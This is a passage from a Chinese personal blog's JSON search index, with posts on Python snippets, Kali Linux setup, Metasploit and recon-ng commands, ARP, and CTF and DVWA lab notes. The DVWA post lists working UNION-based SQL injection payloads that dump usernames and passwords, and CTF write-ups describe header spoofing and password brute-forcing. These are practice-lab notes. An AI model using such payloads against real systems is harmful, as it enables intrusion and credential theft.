main()","categories":[{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"}],"tags":[{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"}]},{"title":"python进度条","slug":"python进度条","date":"2020-05-28T22:46:48.000Z","updated":"2020-05-28T22:47:37.557Z","comments":true,"path":"categories/python/python进度条/","link":"","permalink":"https://lacc233.github.io/categories/python/python%E8%BF%9B%E5%BA%A6%E6%9D%A1/","excerpt":"进度条","text":"进度条 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python3# -*-coding:utf-8-*-# Created by 0vox on 2020/5/27import sysimport mathdef progress_bar(portion, total): \"\"\" total 总数据大小，portion 已经传送的数据大小 :param portion: 已经接收的数据量 :param total: 总数据量 :return: 接收数据完成，返回True \"\"\" part = total / 50 # 1%数据的大小 count = math.ceil(portion / part) sys.stdout.write('\\r') sys.stdout.write(('[%-50s]%.2f%%' % (('&gt;' * count), portion / total * 100))) sys.stdout.flush() if portion &gt;= total: sys.stdout.write('\\n') return Truedef main(): # 调用方式 portion = 0 total = 254820000 while True: portion += 1024 sum = progress_bar(portion, total) if sum: break print(\"ok\")if __name__ == '__main__': main()","categories":[{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"}],"tags":[{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"}]},{"title":"python文件目录遍历","slug":"python文件目录遍历","date":"2020-05-28T22:44:57.000Z","updated":"2020-05-28T22:46:29.531Z","comments":true,"path":"categories/python/python文件目录遍历/","link":"","permalink":"https://lacc233.github.io/categories/python/python%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/","excerpt":"遍历目录","text":"遍历目录 123456789101112131415161718192021222324252627282930313233343536373839404142# encoding:utf-8\"\"\"文件读写遍历目录下所有文件\"\"\"import osfrom os.path import join# 写文件def writeFile(file): fd = open(file, \"a\") fd.write(\"123456\") fd.close()# 读文件def readFile(file): fd = open(file, \"r\") print(fd.readline()) fd.close()# 遍历目录def walkFile(file): for root, dirs, files in os.walk(file): for f in files: print(join(root, f)) for d in dirs: print(join(root, d))def main(): walkFile(\"./\") # writeFile(\"file-result.txt\") # readFile(\"file-result.txt\")if __name__ == '__main__': main()","categories":[{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"}],"tags":[{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"}]},{"title":"python正则匹配","slug":"python正则匹配","date":"2020-05-28T22:41:42.000Z","updated":"2020-05-28T22:44:26.525Z","comments":true,"path":"categories/python/python正则匹配/","link":"","permalink":"https://lacc233.github.io/categories/python/python%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D/","excerpt":"正则匹配","text":"正则匹配 123456789101112131415161718192021222324252627282930313233343536373839404142# encoding:utf-8import re# 字符串str1 = '6中文9'# 正则表达式# 匹配双字节字符(包括汉字在内): [^\\x00-\\xff]# 匹配空白行 \\n\\s*\\r# 匹配Email地址 [\\w!#$%&amp;'*+/=?^_`&#123;|&#125;~-]+(?:\\.[\\w!#$%&amp;'*+/=?^_`&#123;|&#125;~-]+)*@(?:[\\w](?:[\\w-]*[\\w])?\\.)+[\\w](?:[\\w-]*[\\w])?# 匹配网址URL [a-zA-z]+://[^\\s]*# 匹配国内电话号码 \\d&#123;3&#125;-\\d&#123;8&#125;|\\d&#123;4&#125;-\\&#123;7,8&#125;# 匹配腾讯QQ号 [1-9][0-9]&#123;4,&#125;# 匹配中国邮政编码 [1-9]\\d&#123;5&#125;(?!\\d)# 匹配18位身份证号 ^(\\d&#123;6&#125;)(\\d&#123;4&#125;)(\\d&#123;2&#125;)(\\d&#123;2&#125;)(\\d&#123;3&#125;)([0-9]|X)$# 匹配(年-月-日)格式日期 ([0-9]&#123;3&#125;[1-9]|[0-9]&#123;2&#125;[1-9][0-9]&#123;1&#125;|[0-9]&#123;1&#125;[1-9][0-9]&#123;2&#125;|[1-9][0-9]&#123;3&#125;)-(((0[13578]|1[02])-(0[1-9]|[12][0-9]|3[01]))|((0[469]|11)-(0[1-9]|[12][0-9]|30))|(02-(0[1-9]|[1][0-9]|2[0-8])))# 匹配正整数 ^[1-9]\\d*$# 匹配负整数 ^-[1-9]\\d*$# 匹配整数 ^-?[1-9]\\d*$# 匹配非负整数（正整数 + 0） ^[1-9]\\d*|0$# 匹配非正整数（负整数 + 0） ^-[1-9]\\d*|0$# 匹配正浮点数 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$# 匹配负浮点数 ^-[1-9]\\d*\\.\\d*|-0\\.\\d*[1-9]\\d*$pattern_value = r\"[\\u4e00-\\u9fa5]\"# 实例化一个正则对象pattern = re.compile(pattern_value)# 正则匹配，方法：# match() 开头匹配# search() 全文匹配第一个# findall() 全文匹配全部，返回列表# finditer() 全文匹配全部，返回迭代器result = pattern.findall(str1)# for i in result:# print(i.group())# print(result)# 将符合正则的替换为某值result_sub = re.sub(pattern, '新文字', str1)# print(result_sub)","categories":[{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"}],"tags":[{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"}]},{"title":"python打印图片","slug":"python打印图片","date":"2020-05-28T22:36:17.000Z","updated":"2020-05-28T22:40:31.901Z","comments":true,"path":"categories/python/python打印图片/","link":"","permalink":"https://lacc233.github.io/categories/python/python%E6%89%93%E5%8D%B0%E5%9B%BE%E7%89%87/","excerpt":"打印图片","text":"打印图片 用在线工具将图片转为ascii 之后打印代码为： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# -*-coding:utf-8-*-# Created by 0vox on 2020/5/26import timedef printP1(): fd = open(\"dog.txt\") for i in range(23): print(fd.readline(), end=\"\") time.sleep(0.1) fd.close()def printP2(): for text in open(\"dog.txt\"): print(text, end=\"\") # print(text.replace(\"\\r\", \"\").replace(\"\\n\", \"\")) time.sleep(0.1)def printP3(): dog_png = \"\"\" ,i :,,,,,,.: ,,.,,,,,,,,,,,,,,,,,, ,,,,,;1,,.,,,,,,.,,,:i ;::,,, i ,,,,,,,,,;;:::.,; ::,,,,.:C8G.,,,,,,::::;:,:,.,: ,, ;,,, :,::.... ;1i ::i,::,,,, ,,,,: G ti ::G88i::,,,,,,,: : GLLLG. :,,::: ;;:,,:i . :::: i;::: .:,,; .::: ;;:: :: .,.:..,1,,;;:: ;;; .::i 1,,::;::::::::::,.:::::::,:::, .::::::::::::::::::::: ; .,::::::::::::::::::::i .....,:::::::::::::::::::; ;...,,::::::::::,::::::::,: ,;.,,:::::.... :::::::::::; ,,,:::::,........,::::::::: i,:::::i ;;;;;;i , ,,::::1 , . :::::: ..;;;;; . . ..i ... ....; . :., ;, ........ ; .. i i i;,, \"\"\" dog = dog_png.split(\"\\r\") for i in dog: print(i)def main(): printP1() # printP2() # printP3()if __name__ == \"__main__\": main() dog.txt: 1234567891011121314151617181920212223 ,i :,,,,,,.: ,,.,,,,,,,,,,,,,,,,,, ,,,,,;1,,.,,,,,,.,,,:i ;::,,, i ,,,,,,,,,;;:::.,; ::,,,,.:C8G.,,,,,,::::;:,:,.,: ,, ;,,, :,::.... ;1i ::i,::,,,, ,,,,: G ti ::G88i::,,,,,,,: : GLLLG. :,,::: ;;:,,:i . :::: i;::: .:,,; .::: ;;:: :: .,.:..,1,,;;:: ;;; .::i 1,,::;::::::::::,.:::::::,:::, .::::::::::::::::::::: ; .,::::::::::::::::::::i .....,:::::::::::::::::::; ;...,,::::::::::,::::::::,: ,;.,,:::::.... :::::::::::; ,,,:::::,........,::::::::: i,:::::i ;;;;;;i , ,,::::1 , . :::::: ..;;;;; . . ..i ... ....; . :., ;, ........ ; .. i i i;,,","categories":[{"name":"python","slug":"python","permalink":"https://lacc233.github.io/categories/python/"}],"tags":[{"name":"python3","slug":"python3","permalink":"https://lacc233.github.io/tags/python3/"}]},{"title":"kali之弱点扫描","slug":"kali之弱点扫描","date":"2020-05-17T00:39:28.000Z","updated":"2020-06-15T05:29:01.936Z","comments":true,"path":"categories/Linux/Kali-Linux/kali之弱点扫描/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%E4%B9%8B%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/","excerpt":"漏洞发现","text":"漏洞发现 漏洞发现 搜索漏洞利用代码 exploit-db searchsploit tomcat (kali命令) `/usr/share/exploitdb 概念 cve oval 扫描器nmap 12cd /usr/share/nmap/scritsless script.db | grep vuln | wc -l # 漏洞利用脚本个数 nessus 12dpkg -i 报名 # 安装/etc/init.d/nessesd start nexpose 漏洞验证metasploit","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[]},{"title":"vulhub","slug":"vulhub","date":"2020-05-14T03:41:46.000Z","updated":"2020-05-14T03:52:27.428Z","comments":true,"path":"categories/靶场/vulhub/","link":"","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/vulhub/","excerpt":"Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。 vulhub-github","text":"Vulhub是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。 vulhub-github 问题执行这部时，报错 1docker-compose build 报错为 123ERROR: Couldn’t connect to Docker daemon at http+docker://localunixsocket - is it running?If it’s at a non-standard location, specify the URL with the DOCKER_HOST environment variable. 解决办法，添加当前用户到docker用户组,后重启 1sudo gpasswd -a $&#123;USER&#125; docker 开启docker服务，再运行，成功 1docker-compose build 靶场演练1234567891011# Enter the directory of vulnerability/environmentcd flask/ssti# Compile environmentdocker-compose build# Run environmentdocker-compose up -d# After the test, delete the environment with the following command.docker-compose down -v","categories":[{"name":"靶场","slug":"靶场","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"vulhub","slug":"vulhub","permalink":"https://lacc233.github.io/tags/vulhub/"}]},{"title":"DVWA","slug":"DVWA","date":"2020-05-13T13:02:22.000Z","updated":"2020-05-13T15:12:03.193Z","comments":true,"path":"categories/靶场/DVWA/","link":"","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/DVWA/","excerpt":"dvwa靶场练习","text":"dvwa靶场练习 SQL InjectionMedium123456爆库，表id&#x3D;0 union select database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() %23 &amp;Submit&#x3D;Submit爆字段名，此处的users转换为hexid&#x3D;0 union select database(),group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;0x7573657273 %23 &amp;Submit&#x3D;Submit爆字段值id&#x3D;0 union select database(),group_concat(user,0x3a,password) from dvwa.users %23 &amp;Submit&#x3D;Submit highpost报错注入 12爆库0&#39; union select database(),2 and &#39;1&#39;&#x3D;&#39;1","categories":[{"name":"靶场","slug":"靶场","permalink":"https://lacc233.github.io/categories/%E9%9D%B6%E5%9C%BA/"}],"tags":[]},{"title":"就差一把钥匙","slug":"就差一把钥匙","date":"2020-05-09T15:49:10.000Z","updated":"2020-05-09T23:33:31.845Z","comments":true,"path":"categories/WriteUp/就差一把钥匙/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E5%B0%B1%E5%B7%AE%E4%B8%80%E6%8A%8A%E9%92%A5%E5%8C%99/","excerpt":"合天网安实验室靶场：就差一把钥匙 难度：初级","text":"合天网安实验室靶场：就差一把钥匙 难度：初级 nmap嗅探，得到robots.txt,访问之 再访问console/ 添加x-forwarded-for: 127.0.0.1,篡改数据后send get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"}]},{"title":"神奇的磁带","slug":"神奇的磁带","date":"2020-05-09T10:55:07.000Z","updated":"2020-05-09T14:44:31.658Z","comments":true,"path":"categories/WriteUp/神奇的磁带/","link":"","permalink":"https://lacc233.github.io/categories/WriteUp/%E7%A5%9E%E5%A5%87%E7%9A%84%E7%A3%81%E5%B8%A6/","excerpt":"合天网安实验室靶场：神奇的磁带 难度：初级","text":"合天网安实验室靶场：神奇的磁带 难度：初级 这是一个套娃,下面开始蛇皮~ 浏览器访问 burp抓包，cookie值base64解密 1234#解密echo cTEyMzQ1Njc4OTBwLi4= | base64 -d#加密echo q1234567890p.. | base64 提交解密后的值 告诉我们要提交磁带的英文tape 给了个txt文件地址，访问之 提交btzhy 给了个php页面，访问之 看源码，提示密码两位，生成字典，burp爆破模块，爆破之 1crunch 2 2 \"0123456789\" &gt; pwd.txt 比较响应长度，确认为66 提交，get flag!","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"https://lacc233.github.io/categories/WriteUp/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://lacc233.github.io/tags/CTF/"},{"name":"CTF-Web","slug":"CTF-Web","permalink":"https://lacc233.github.io/tags/CTF-Web/"}]},{"title":"metasploit入门","slug":"metasploit入门","date":"2020-04-17T05:39:43.000Z","updated":"2020-05-10T11:18:26.653Z","comments":true,"path":"categories/工具/metasploit入门/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/metasploit%E5%85%A5%E9%97%A8/","excerpt":"Metasploit基本使用","text":"Metasploit基本使用 检查更新12apt updateapt install Metasploit-framework msfconsole用户接口msfconsole位于 /usr/share/metasploit-framework/msfconsole 目录中 几乎可以使用全部msf功能 控制台命令支持 Tab自动补齐 支持外部命令的执行（系统命令等） 启动1msfconsole 静默启动1msfconsole -q 其他参数 在控制台传递-h参数 1msfconsole -h 用法: msfconsole [选项] 通用选项: -E, –environment ENVIRONMENT 如果已设置，将使用RAIL_ENV环境变量。如果两个选项都不是RAILS_ENV环境变量，则默认为生产。 数据库选项: -M, –migration-path DIRECTORY 指定包含其他数据库迁移的目录 -n, –no-database 禁用数据库支持 -y, –yaml PATH 指定一个包含数据库设置的YAML文件 框架选项 : -c FILE 加载指定的配置文件 -v, -V, –version 显示版本 模块选项 : –defer-module-loads 延迟模块加载，除非明确询问。 -m, –module-path DIRECTORY 附加模块路径 控制台选项 : -a, –ask 在退出Metasploit之前询问或接受“exit-y” -H, –history-file FILE 将命令历史保存到指定的文件 -L, –real-readline 使用系统Readline库而不是RbReadline -o, –output FILE 将文件输出到指定的文件 -p, –plugin PLUGIN 在启动时加载插件 -q, –quiet 不要在启动时打印横幅 -r, –resource FILE 执行指定的资源文件（ - 用于stdin） -x, –execute-command COMMAND 执行指定的字符串作为控制台命令（使用;用于multiples） -h, –help 显示此消息 在msf命令提示符下输入help或? 1msf5 &gt; help 核心命令 命令 描述 ? 帮助菜单banner 显示一个awesome metasploit横幅cd 更改当前的工作目录color 切换颜色connect 连接与主机通信exit 退出控制台get 获取特定于上下文的变量的值getg 获取全局变量的值grep grep另一个命令的输出help 帮助菜单history 显示命令历史load 加载一个框架插件quit 退出控制台repeat Repeat a list of commandsroute 通过会话路由流量save 保存活动的数据存储sessions 转储会话列表并显示有关会话的信息set 将特定于上下文的变量设置为一个值setg 将特定于上下文的变量设置为一个值sleep 在指定的秒数内不做任何事情spool 将控制台输出写入文件以及屏幕threads 线程查看和操作后台线程tip Show a useful productivity tipunload 卸载框架插件unset 取消设置一个或多个特定于上下文的变量unsetg 取消设置一个或多个全局变量version 显示框架和控制台库版本号 模块命令 指令 描述 advanced 显示一个或多个模块的高级选项back 从当前上下文返回clearm Clear the module stackinfo 显示有关一个或多个模块的信息listm List the module stackloadpath 路径从路径搜索并加载模块options 显示全局选项或一个或多个模块popm 将最新的模块从堆栈中弹出并使其处于活动状态previous 将最新的模块从堆栈中弹出并使其处于活动状态pushm 将活动或模块列表推入模块堆栈reload_all 从所有定义的模块路径重新加载所有模块search 搜索模块名称和描述show 显示给定类型的模块或所有模块use 按名称选择模块 or search term/index 工作命令 Command Description handler 作为作业启动负载处理程序jobs 作为作业启动负载处理程序kill 杀死一个工作rename_job 重命名作业 资源脚本命令 Command Description makerc 保存从开始到文件输入的命令resource 运行存储在文件中的命令 数据库后端命令 Command Description analyze Analyze database information about a specific address or address rangedb_connect 连接到现有的数据库db_disconnect 断开与当前数据库实例的连接db_export 导出包含数据库内容的文件db_import 导入扫描结果文件（文件类型将被自动检测）db_nmap 执行nmap并自动记录输出db_rebuild_cache 重建数据库存储的模块高速缓存db_remove Remove the saved data service entrydb_save Save the current data service connection as the default to reconnect on startupdb_status 显示当前的数据库状态hosts 列出数据库中的所有主机loot 列出数据库中的所有战利品notes 列出数据库中的所有笔记services 列出数据库中的所有服务vulns 列出数据库中的所有漏洞workspace 在数据库工作区之间切换 凭证后端命令 Command Description creds 列出数据库中的所有凭据 开发人员的命令 Command Description edit 使用首选编辑器编辑当前模块或文件irb 在当前环境中打开一个交互式Ruby shelllog 日志显示框架。如果可能的话，将日志分页到最后pry 在当前模块或框架上打开pry调试器reload_lib 从指定的路径重新加载Ruby库文件","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"arp协议之跨网段和同网段","slug":"arp协议之跨网段和同网段","date":"2020-04-08T22:40:24.000Z","updated":"2020-05-10T11:30:09.895Z","comments":true,"path":"categories/网络协议/arp协议之跨网段和同网段/","link":"","permalink":"https://lacc233.github.io/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/arp%E5%8D%8F%E8%AE%AE%E4%B9%8B%E8%B7%A8%E7%BD%91%E6%AE%B5%E5%92%8C%E5%90%8C%E7%BD%91%E6%AE%B5/","excerpt":"http://www.360doc.com/content/18/0723/19/11935121_772679821.shtml","text":"http://www.360doc.com/content/18/0723/19/11935121_772679821.shtml ARP协议属于TCP/IP分层中的哪一层ARP协议具体属于哪一层，有不同的说法 从ARP的功能来看，我们知道ARP的主要是实现IP地址到MAC的映射，如果单就功能来说的话，ARP应该是属于链路层的协议。 但是从数据封装的角度来看，ARP协议应该属于网络层。因为ARP是基于Ethernet 协议，而且从以太网数据帧的格式来看，Ethernet协议里面有独立的Type类型，ARP是0x0806而IP协议的Type 为0x0800，从这个角度来看ARP协议是和IP协议平等的，所以它又属于网络层。我们好多教材上也是把ARP协议划到网络层。 什么样的网络通信中才需要ARP协议我们知道ARP的功能是实现IP地址到物理地址的映射，这里的物理地址是指MAC地址，那么问题是什么样的物理接口有MAC地址呢？答案是Ethernet接口，所以如果A和B通信的接口是Ethernet接口那么他们之间的通信才需要知道彼此的MAC地址，也就是说才需要ARP去获得MAC地址。换句话说:通信双方A与B的物理接口是Serial interface 且二层封装是PPP/HDLC就不需要ARP，因为PPP/HDLC封装头部信息没有MAC地址信息！ ARP在同一个局域网内实现的流程之前的文章已经说了，如果主机A要想通过B的IP地址确定其MAC地址并和B进行数据交互，需要按照ARP协议的”广播请求和单播应答”来确定主机B的MAC地址。流程我们重复一遍： 1） A先查看自己的ARP高速缓存表中是否有B主机的MAC地址记录。 2） 如果A的ARP高速缓存表中有B的MAC地址记录，则直接通过这个MAC地址进行数据的传输。 3） 如果A主机的ARP高速缓存中没有B主机的记录，则会向局域网的所有主机广播一个ARP请求，寻找B主机的MAC地址。 4） 当B主机收到A主机广播的ARP请求后，就会直接给A主机回复一个ARP数据包。 5） 当A主机收到B主机发送过来的请求后，将B的MAC地址写入高速缓存中，然后通过该MAC地址，A主机向B主机进行数据的传输 ARP在局域网中跨网段主机间通讯的工作原理对于跨网段的ARP工作我们首先需要知道的是： ARP请求以广播发送、以单播回应 路由器隔离广播。每一个网段都是独立的广播域 跨越网段通信需要使用网关的mac地址 A与B不在一个网段，A查询自己的路由表，知道如果想和B通信则必须通过gateway 来中转，所以会在与gateway 直连的接口（假定 Ethernet接口）上请求gateway 的MAC地址。 A主机先通过广播一个ARP请求，找到本网络中的一个路由器的MAC地址，然后将数据包直接给路由器。 当路由收到数据包后，如果B主机在同网络中的话，这时通过ARP找到B主机，然后把数据包给B主机。 如果B主机不和A主机发送数据的路由器在同一网络内的话，则路由器会通过ARP协议找到下一跳的路由器，然后把数据包发送到该路由上，以此类推。","categories":[{"name":"网络协议","slug":"网络协议","permalink":"https://lacc233.github.io/categories/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"}],"tags":[{"name":"arp","slug":"arp","permalink":"https://lacc233.github.io/tags/arp/"}]},{"title":"recon-ng工具详解","slug":"recon-ng工具详解","date":"2020-04-07T23:27:44.000Z","updated":"2020-05-22T03:38:58.270Z","comments":true,"path":"categories/工具/recon-ng工具详解/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/recon-ng%E5%B7%A5%E5%85%B7%E8%AF%A6%E8%A7%A3/","excerpt":"web信息搜索框架，基于python开发 使用方法：模块，数据库，报告 项目地址： https://github.com/lanmaster53/recon-ng","text":"web信息搜索框架，基于python开发 使用方法：模块，数据库，报告 项目地址： https://github.com/lanmaster53/recon-ng recon-ng –hrlp123456789-h, --help 帮助显示此帮助消息并退出 -w workspace 加载/创建一个工作空间 -r filename 从资源文件加载命令 --no-version 禁用版本检查。在默认情况下已禁用 --no-analytics 禁用分析报告。默认情况下已经禁用 --no-marketplace 禁用远程模块管理 --stealth 禁用所有被动请求(- no-*) --accessible 可访问的可用的输出 --version 显示当前版本 help1234567891011121314151617back 退出当前上下文dashboard 显示活动的摘要db 与工作区的数据库接口exit 退出框架help 帮助显示此菜单index 创建模块索引(仅适用于dev)keys 密钥管理第三方资源凭据marketplace 接口与模块marketplacemodules 接口与安装的模块options 管理当前上下文选项pdb 启动一个Python调试器会话(仅适用于dev)script 记录并执行命令脚本shell 执行shell命令show 显示了各种框架项snapshots 管理工作区快照spool 线轴输出到一个文件workspaces 管理工作区 查看所有模块1marketplace search 下载recon目录下的所有模块1marketplace install recon 查看所有已安装的模块1modules search 安装并运用某个模块12345678910111213141516#更新索引marketplace refresh#搜索marketplace search recon#安装实例：hackertargetmarketplace install recon/domains-hosts/hackertarget#加载模块modules load recon/domains-hosts/hackertarget#显示信息info#设置参数options set SOURCE rapid7.com#执行run#显示结果show hosts","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"kali代理","slug":"kali代理","date":"2020-04-07T02:36:16.000Z","updated":"2020-06-15T05:36:27.993Z","comments":true,"path":"categories/Linux/Kali-Linux/kali代理/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%E4%BB%A3%E7%90%86/","excerpt":"kali linux 网络代理设置","text":"kali linux 网络代理设置 tor代理 下载 https://www.torproject.org/download/ 配置（configure） Tor is censored in my cuntry Select a bulit-in bridge 选择meek-azure connect 更新源代理设置12345/etc/apt/apt.confAcquire::ftp::proxy \"ftp://127.0.0.1:8087/\";Acquire::http::proxy \"http://127.0.0.1:8087/\";Acquire::https::proxy \"https://127.0.0.1:8087/\";Acquire::socks::proxy \"https://127.0.0.1:8087/\"; 命令行代理设置12345/etc/bash.bashrcexport ftp_proxy=\"ftp://user:password@proxyIP:port\"export http_proxy=\"http://user:password@proxyIP:port\"export https_proxy=\"https://user:password@proxyIP:port\"export socks_proxy=\"https://user:password@proxyIP:port\" 代理链公开的代理服务器 配置代理链 123vi /etc/proxychains.confproxychains 命令 #命令走代理...","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[]},{"title":"kali更新升级,安装与卸载软件包","slug":"kali更新升级,安装与卸载软件包","date":"2020-04-03T07:13:32.000Z","updated":"2020-06-15T05:28:46.901Z","comments":true,"path":"categories/Linux/Kali-Linux/kali更新升级,安装与卸载软件包/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7,%E5%AE%89%E8%A3%85%E4%B8%8E%E5%8D%B8%E8%BD%BD%E8%BD%AF%E4%BB%B6%E5%8C%85/","excerpt":"更新升级，安装软件","text":"更新升级，安装软件 更新升级命令 路径 1vim /etc/apt/sources.list 添加源 123456789#kali官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib#中科大的源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#浙江大学源deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib 更新软件包索引文件 1apt-get update 将更新的软件包下载下来 1apt-get upgrade 版本更新 1apt-get dist-upgrade//软件升级 更新系统 1apt full-upgrade //通过卸载|安装|升级等方式来更新系统 自动卸载不需要的软件包 1apt-get autoremove 自动清除软件包 1apt-get autoclean 查看系统版本 12grep VERSION /etc/os-releaseuname -a 安装软件 安装中文输入法 1sudo apt-get install ibus ibus-pinyin 若提示如下，照做即可 安装pip 1sudo apt-get install python-pip 安装播放器parole 1sudo apt-get install parole 安装falsh插件 1sudo apt-get install flashplugin-nonfree 安装gdebi(图像化安装deb包) 1sudo apt-get install gdebi 当然在字符界面下，安装deb包命令如下 1dpkg -i xxxx.deb 下载bt 1sudo apt-get install qbittorrent 简便的程序开发环境geany puthon shell脚本..,它都可以 1sudo apt-get install geany 字典 翻译软件 1sudo apt-get install stardict 词库下载http://download.huzheng.org/zh_CN/下载朗道词典 文件差异比较 图形化的工具 1sudo apt-get install meld 字体 习惯windows字体的可以更换这个 1sudo apt-get install ttf-wqy-microhei 查看chm文件 1sudo apt-get install kchmviewer 思维导图 1sudo apt-get install freemind 显示网速 1sudo apt-get install netspeed 路由追踪 图形化 1sudo apt-get install mtr 也可使用命令 1traceroute ftp客户端 1sudo apt-get install filezilla filezilla-common chromium浏览器 1sudo apt-get install chromium 开发.net环境 mono套件 12sudo apt-get install monodevelop mono-gmcs或 mono-xbuild mono-mcs mono-devel 安装与卸载软件命令1234apt-get install software_name :安装软件apt-get --purge remove software_name :卸载软件及其配置apt-get autoremove software_name:卸载软件及其依赖的安装包dpkg --list:罗列已安装软件 问题1:更新系统，空间不足E: 您在 /var/cache/apt/archives/ 上没有足够的可用空间。分区多份点 1apt-get clean 软链接到HOME下的一个目录即可，home下新建debs文件夹：在某个空间大的分区建立一个目录，然后把/var/cache/apt/archives换成指向那个目录的软链接 12sudo rm -rf /var/cache/apt/archivessudo ln -s “$HOME/debs” /var/cache/apt/archives s 问题2：没有公钥W: GPG 错误：http://archive.ubuntu.com/ubuntu trusty Release: 由于没有公钥，无法验证下列签名： NO_PUBKEY 40976EAF437D05B5 NO_PUBKEY 3B4FE6ACC0B21F32 1sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys E40EBBA24FF2FC69 注意E40EBBA24FF2FC69需替换为40976EAF437D05B5 3B4FE6ACC0B21F32，也就是要与你的错误提示中的签名一致。 1sudo apt-get update 问题3：dpkg: 处理归档 /var/cache/apt/archives/openjdk-11-amd64.deb (–unpack)时出错： 无法为 ‘./usr/lib/jvm/java-11-openjdk-amd64/lib/m’/usr/lib/jvm/java-11-openjdk-amd64/lib/modules.dp上没有空间)dpkg-deb: 错误: 粘贴 子进程被信号(断开的管道) 终止在处理时有错误发生： /var/cache/apt/archives/openjdk-11-jre-headless_1E: Sub-process /usr/bin/dpkg returned an error codroot@fg:~# 1dpkg -i --force-overwrite /var/cache/apt/archives/某.deb 问题4:缺乏依赖如缺依赖包，执行apt-get install 依赖包名 按提示输入命令apt --fix-broken install 再次执行dpkg -i 文件名.deb","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[]},{"title":"win下解决python2与3切换，pip共存","slug":"win下解决python2与3切换，pip共存","date":"2020-04-03T00:57:17.000Z","updated":"2020-05-10T11:26:27.575Z","comments":true,"path":"categories/Windows/win下解决python2与3切换，pip共存/","link":"","permalink":"https://lacc233.github.io/categories/Windows/win%E4%B8%8B%E8%A7%A3%E5%86%B3python2%E4%B8%8E3%E5%88%87%E6%8D%A2%EF%BC%8Cpip%E5%85%B1%E5%AD%98/","excerpt":"Windows下解决python2与3切换，pip共存","text":"Windows下解决python2与3切换，pip共存 python2与3切换 安装py2，py3 python官网:https://www.python.org/ 添加py2/py3的路径到系统变量 修改python两个版本的的名字为python2和python3 ) 修改完成后去cmd命令行中测试，成功如下图 pip共存 重新安装两个版本的pip （分别在各自的py环境下强制更新并安装pip ） 重新安装pip2: 1python2 -m pip install --upgrade pip --force-reinstall 重新安装pip3: 1python3 -m pip install --upgrade pip --force-reinstall 测试","categories":[{"name":"Windows","slug":"Windows","permalink":"https://lacc233.github.io/categories/Windows/"}],"tags":[]},{"title":"wireshark详解","slug":"wireshark详解","date":"2020-01-13T05:35:33.000Z","updated":"2020-05-10T11:21:38.231Z","comments":true,"path":"categories/工具/wireshark详解/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/wireshark%E8%AF%A6%E8%A7%A3/","excerpt":"https://www.fujieace.com/hacker/tools/wireshark-4.html 抓包嗅探协议分析，安全专家必备的技能，抓包引擎linux的libpcap,windows的winpcap,解码能力。","text":"https://www.fujieace.com/hacker/tools/wireshark-4.html 